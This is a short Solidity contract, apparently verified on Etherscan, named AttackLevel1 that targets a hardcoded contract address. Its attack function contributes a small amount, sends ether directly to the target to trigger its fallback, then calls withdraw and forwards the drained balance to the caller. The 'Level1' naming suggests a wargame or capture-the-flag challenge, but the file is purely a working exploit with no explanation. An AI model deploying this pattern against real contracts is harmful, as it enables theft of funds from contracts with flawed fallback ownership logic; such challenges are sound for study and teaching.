/**
 *Submitted for verification at Etherscan.io on 2022-07-10
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Level1 {
    function withdraw() external;
    function contribute() external payable;
}

contract AttackLevel1 {
    Level1 private level1;

    constructor() {
        level1 = Level1(0x7717554cE81f6255D223e64f6cA9ABF4c131e4cf);
    }

    receive() external payable {}

    function attack() external payable {
        level1.contribute{value: 0.0001 ether}();
        payable(address(level1)).transfer(0.0001 ether);

        level1.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }
}